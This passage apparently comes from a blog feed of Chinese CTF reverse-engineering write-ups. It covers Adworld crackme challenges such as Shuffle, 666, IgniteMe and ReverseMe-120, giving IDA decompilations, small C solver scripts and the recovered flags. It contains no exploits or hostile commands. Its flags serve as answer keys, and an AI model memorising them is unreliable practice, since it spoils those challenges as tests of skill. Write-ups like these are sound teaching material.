^&#x3D; v2;</span><br><span class="line">    ++v3;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall check(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; 1;</span><br><span class="line">  sleep(2LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(i + a1) !&#x3D; byte_6D4100[i] )</span><br><span class="line">      v2 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个异或加一个比较。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int v2 &#x3D; 55;</span><br><span class="line">    int v3 &#x3D; 0;</span><br><span class="line">    char flag[33];</span><br><span class="line">    char result[33];</span><br><span class="line">    int byte_6D4100[33]&#x3D;&#123;0x53,0x52,0x66,0x5F,0x42,0x4F,0x71,0x50,0xD,0x21,0x28,0x1F,0x6C,</span><br><span class="line">    0x35,0x18,0x26,0x79,</span><br><span class="line">    0x39,0x2E,0x2B,0x16,0x7F,0x24,0x29,0x25,0x3A,0xC,0x1F,0x37,9,0x25,0x67,0x2C&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] &#x3D; byte_6D4100[i];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result[i] &#x3D; flag[i]^v2;</span><br><span class="line">        result[i] +&#x3D; 2;</span><br><span class="line">        v2++;</span><br><span class="line">        printf(&quot;%c&quot;,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{uNp4ck_1s_b@sic_5kill_Of_r3}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h1><a id="more"></a><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4942&page=1">题目链接</a><br>ida64打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; &#39;S&#39;;</span><br><span class="line">v11 &#x3D; &#39;E&#39;;</span><br><span class="line">v12 &#x3D; &#39;C&#39;;</span><br><span class="line">v13 &#x3D; &#39;C&#39;;</span><br><span class="line">v14 &#x3D; &#39;O&#39;;</span><br><span class="line">v15 &#x3D; &#39;N&#39;;</span><br><span class="line">v16 &#x3D; &#39;&#123;&#39;;</span><br><span class="line">v17 &#x3D; &#39;W&#39;;</span><br><span class="line">v18 &#x3D; &#39;e&#39;;</span><br><span class="line">v19 &#x3D; &#39;l&#39;;</span><br><span class="line">v20 &#x3D; &#39;c&#39;;</span><br><span class="line">v21 &#x3D; &#39;o&#39;;</span><br><span class="line">v22 &#x3D; &#39;m&#39;;</span><br><span class="line">v23 &#x3D; &#39;e&#39;;</span><br><span class="line">v24 &#x3D; &#39; &#39;;</span><br><span class="line">v25 &#x3D; &#39;t&#39;;</span><br><span class="line">v26 &#x3D; &#39;o&#39;;</span><br><span class="line">v27 &#x3D; &#39; &#39;;</span><br><span class="line">v28 &#x3D; &#39;t&#39;;</span><br><span class="line">v29 &#x3D; &#39;h&#39;;</span><br><span class="line">v30 &#x3D; &#39;e&#39;;</span><br><span class="line">v31 &#x3D; &#39; &#39;;</span><br><span class="line">v32 &#x3D; &#39;S&#39;;</span><br><span class="line">v33 &#x3D; &#39;E&#39;;</span><br><span class="line">v34 &#x3D; &#39;C&#39;;</span><br><span class="line">v35 &#x3D; &#39;C&#39;;</span><br><span class="line">v36 &#x3D; &#39;O&#39;;</span><br><span class="line">v37 &#x3D; &#39;N&#39;;</span><br><span class="line">v38 &#x3D; &#39; &#39;;</span><br><span class="line">v39 &#x3D; &#39;2&#39;;</span><br><span class="line">v40 &#x3D; &#39;0&#39;;</span><br><span class="line">v41 &#x3D; &#39;1&#39;;</span><br><span class="line">v42 &#x3D; &#39;4&#39;;</span><br><span class="line">v43 &#x3D; &#39; &#39;;</span><br><span class="line">v44 &#x3D; &#39;C&#39;;</span><br><span class="line">v45 &#x3D; &#39;T&#39;;</span><br><span class="line">v46 &#x3D; &#39;F&#39;;</span><br><span class="line">v47 &#x3D; &#39;!&#39;;</span><br><span class="line">v48 &#x3D; &#39;&#125;&#39;;</span><br></pre></td></tr></table></figure><blockquote><p>SECCON{Welcome to the SECCON 2014 CTF!}</p></blockquote><h1 id="666"><a href="#666" class="headerlink" title="666"></a>666</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5573&page=1">题目链接</a><br>ida64打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-1E0h]</span><br><span class="line">  char v5; &#x2F;&#x2F; [rsp+F0h] [rbp-F0h]</span><br><span class="line"></span><br><span class="line">  memset(&amp;s, 0, 0x1EuLL);</span><br><span class="line">  printf(&quot;Please Input Key: &quot;, 0LL);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;v5);</span><br><span class="line">  encode(&amp;v5, &amp;s);</span><br><span class="line">  if ( strlen(&amp;v5) &#x3D;&#x3D; key )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s, enflag) )</span><br><span class="line">      puts(&quot;You are Right&quot;);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;flag&#123;This_1s_f4cker_flag&#125;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall encode(const char *a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  char v3[32]; &#x2F;&#x2F; [rsp+10h] [rbp-70h]</span><br><span class="line">  char v4[32]; &#x2F;&#x2F; [rsp+30h] [rbp-50h]</span><br><span class="line">  char v5[40]; &#x2F;&#x2F; [rsp+50h] [rbp-30h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [rsp+78h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+7Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  i &#x3D; 0;</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  if ( strlen(a1) !&#x3D; key )</span><br><span class="line">    return puts(&quot;Your Length is Wrong&quot;);</span><br><span class="line">  for ( i &#x3D; 0; i &lt; key; i +&#x3D; 3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] &#x3D; key ^ (a1[i] + 6);</span><br><span class="line">    v4[i + 1] &#x3D; (a1[i + 1] - 6) ^ key;</span><br><span class="line">    v3[i + 2] &#x3D; a1[i + 2] ^ 6 ^ key;</span><br><span class="line">    *(_BYTE *)(a2 + i) &#x3D; v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + 1LL) &#x3D; v4[i + 1];</span><br><span class="line">    *(_BYTE *)(a2 + i + 2LL) &#x3D; v3[i + 2];</span><br><span class="line">  &#125;</span><br><span class="line">  return a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑很清晰，直接写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char f[18]&#x3D;&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;;</span><br><span class="line">int i,j,k;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 18; i+&#x3D;3 )</span><br><span class="line">    &#123;</span><br><span class="line">    f[i]&#x3D;(f[i]^18)-6;</span><br><span class="line">    f[i+1]&#x3D;(f[i+1]^18)+6;</span><br><span class="line">    f[i+2]&#x3D;f[i+2]^18^6;</span><br><span class="line">        printf(&quot;%c%c%c&quot;,f[i],f[i+1],f[i+2]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>unctf{b66_6b6_66b}</p></blockquote><h1 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4826&page=1">题目链接</a><br>拖入ida</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">  char s; &#x2F;&#x2F; [rsp+0h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+108h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Enter the password: &quot;, a2, a3);</span><br><span class="line">  if ( !fgets(&amp;s, 255, stdin) )</span><br><span class="line">    return 0LL;</span><br><span class="line">  if ( sub_4006FD(&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Incorrect password!&quot;);</span><br><span class="line">    result &#x3D; 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Nice!&quot;);</span><br><span class="line">    result &#x3D; 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall sub_4006FD(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+14h] [rbp-24h]</span><br><span class="line">  const char *v3; &#x2F;&#x2F; [rsp+18h] [rbp-20h]</span><br><span class="line">  const char *v4; &#x2F;&#x2F; [rsp+20h] [rbp-18h]</span><br><span class="line">  const char *v5; &#x2F;&#x2F; [rsp+28h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; &quot;Dufhbmf&quot;;</span><br><span class="line">  v4 &#x3D; &quot;pG&#96;imos&quot;;</span><br><span class="line">  v5 &#x3D; &quot;ewUglpt&quot;;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (&amp;v3)[i % 3][2 * (i &#x2F; 3)] - *(i + a1) !&#x3D; 1 )</span><br><span class="line">      return 1LL;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接上脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[3][7]&#x3D;&#123;&#123;&#39;D&#39;,&#39;u&#39;,&#39;f&#39;,&#39;h&#39;,&#39;b&#39;,&#39;m&#39;,&#39;f&#39;&#125;,&#123;&#39;p&#39;,&#39;G&#39;,&#39;&#96;&#39;,&#39;i&#39;,&#39;m&#39;,&#39;o&#39;,&#39;s&#39;&#125;,&#123;&#39;e&#39;,&#39;w&#39;,&#39;U&#39;,&#39;g</span><br><span class="line">  &#39;,&#39;l&#39;,&#39;p&#39;,&#39;t&#39;&#125;&#125;;</span><br><span class="line">int i;</span><br><span class="line">char flag[11];</span><br><span class="line">for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i]&#x3D;a[i % 3][2 * (i &#x2F; 3)]-1;</span><br><span class="line">        printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Code_Talkers</p></blockquote><h1 id="IgniteMe"><a href="#IgniteMe" class="headerlink" title="IgniteMe"></a>IgniteMe</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4590&page=1">题目链接</a><br>ida32打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">  v3 &#x3D; sub_402B30(&amp;unk_446360, &quot;Give me your flag:&quot;);</span><br><span class="line">  sub_4013F0(v3, sub_403670);</span><br><span class="line">  sub_401440(v11, 127);</span><br><span class="line">  if ( strlen(v11) &lt; 0x1E &amp;&amp; strlen(v11) &gt; 4 )</span><br><span class="line">  &#123;</span><br><span class="line">    strcpy(v10, &quot;EIS&#123;&quot;);</span><br><span class="line">    for ( i &#x3D; 0; i &lt; strlen(v10); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v11[i] !&#x3D; v10[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">        sub_4013F0(v6, sub_403670);</span><br><span class="line">        return 0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v12 &#x3D;&#x3D; &#39;&#125;&#39; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( sub_4011C0(v11) )</span><br><span class="line">        v8 &#x3D; sub_402B30(&amp;unk_446360, &quot;Congratulations! &quot;);</span><br><span class="line">      else</span><br><span class="line">        v8 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">      sub_4013F0(v8, sub_403670);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v7 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying! &quot;);</span><br><span class="line">      sub_4013F0(v7, sub_403670);</span><br><span class="line">      result &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; sub_402B30(&amp;unk_446360, &quot;Sorry, keep trying!&quot;);</span><br><span class="line">    sub_4013F0(v4, sub_403670);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">bool __cdecl sub_4011C0(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v2; &#x2F;&#x2F; eax</span><br><span class="line">  signed int v3; &#x2F;&#x2F; [esp+50h] [ebp-B0h]</span><br><span class="line">  char v4[32]; &#x2F;&#x2F; [esp+54h] [ebp-ACh]</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+74h] [ebp-8Ch]</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+78h] [ebp-88h]</span><br><span class="line">  size_t i; &#x2F;&#x2F; [esp+7Ch] [ebp-84h]</span><br><span class="line">  char v8[128]; &#x2F;&#x2F; [esp+80h] [ebp-80h]</span><br><span class="line"></span><br><span class="line">  if ( strlen(a1) &lt;&#x3D; 4 )</span><br><span class="line">    return 0;</span><br><span class="line">  i &#x3D; 4;</span><br><span class="line">  v6 &#x3D; 0;</span><br><span class="line">  while ( i &lt; strlen(a1) - 1 )</span><br><span class="line">    v8[v6++] &#x3D; a1[i++];</span><br><span class="line">  v8[v6] &#x3D; 0;</span><br><span class="line">  v5 &#x3D; 0;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  memset(v4, 0, 0x20u);</span><br><span class="line">  for ( i &#x3D; 0; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 &#x3D; strlen(v8);</span><br><span class="line">    if ( i &gt;&#x3D; v2 )</span><br><span class="line">      break;</span><br><span class="line">    if ( v8[i] &gt;&#x3D; 97 &amp;&amp; v8[i] &lt;&#x3D; 122 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8[i] -&#x3D; 32;</span><br><span class="line">      v3 &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !v3 &amp;&amp; v8[i] &gt;&#x3D; 65 &amp;&amp; v8[i] &lt;&#x3D; 90 )</span><br><span class="line">      v8[i] +&#x3D; 32;</span><br><span class="line">    v4[i] &#x3D; byte_4420B0[i] ^ sub_4013C0(v8[i]);</span><br><span class="line">    v3 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return strcmp(&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;, v4) &#x3D;&#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题就是输入flag，然后大小写相互变化，最后再异或。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int a[32]&#x3D;&#123;0x0D,0x13,0x17,0x11,0x02,0x01,0x20,0x1D,0x0C,0x02,0x19,0x2F,0x17,0x2B,</span><br><span class="line">        0x24,0x1F,0x1E,0x16,0x09,0x0F,0x15,0x27,0x13,0x26,0x0A,0x2F,0x1E,0x1A,0x2D,</span><br><span class="line">0x0C,0x22,0x04&#125;;</span><br><span class="line">char b[24]&#x3D;&quot;GONDPHyGjPEKruv&#123;&#123;pj]X@rF&quot;;</span><br><span class="line">int i,j,v3&#x3D;0;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; 24; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    b[i]&#x3D;((b[i]^a[i])-72)^0x55;</span><br><span class="line">    if ( b[i] &gt;&#x3D; 97 &amp;&amp; b[i] &lt;&#x3D; 122 )</span><br><span class="line">        &#123;</span><br><span class="line">            b[i] -&#x3D; 32;</span><br><span class="line">            v3 &#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( !v3 &amp;&amp; b[i] &gt;&#x3D; 65 &amp;&amp; b[i] &lt;&#x3D; 90 )</span><br><span class="line">            b[i] +&#x3D; 32;</span><br><span class="line">    printf(&quot;%c&quot;,b[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>wadx_tdgk_aihc_ihkn_pjlm</p></blockquote><h1 id="easyRE1"><a href="#easyRE1" class="headerlink" title="easyRE1"></a>easyRE1</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5592&page=2">题目链接</a><br>ida直接看main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s1; &#x2F;&#x2F; [rsp+10h] [rbp-110h]</span><br><span class="line">  unsigned __int64 v5; &#x2F;&#x2F; [rsp+118h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;What is the password?&quot;);</span><br><span class="line">  gets(&amp;s1);</span><br><span class="line">  if ( !strcmp(&amp;s1, &quot;the password&quot;) )</span><br><span class="line">    puts(&quot;FLAG:db2f62a36a018bce28e46d976e3f9864&quot;);</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Wrong!!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着提交一下，对了。</p><blockquote><p>flag{db2f62a36a018bce28e46d976e3f9864}</p></blockquote><h1 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4825&page=2">题目链接</a><br>ida32打开，查看字符串。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/ReverseMe-120.png"></p><p>这道题很可能与base家族有关。</p><p><img src="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/1.png"></p><p>main函数里的运算只有41-44行<br>写脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char a[100]&#x3D;&quot;you_know_how_to_remove_junk_code&quot;;</span><br><span class="line">int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt; strlen(a); i++ )</span><br><span class="line">    &#123;</span><br><span class="line">    a[i] ^&#x3D; 0x25;</span><br><span class="line">    printf(&quot;%c&quot;,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通常情况下，再base64解码就出来了，但这道题竟然是加密，以后还是要认真看ida里的函数。</p><blockquote><p>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame</title>
      <link href="2021/03/01/hgame/"/>
      <url>2021/03/01/hgame/</url>
      
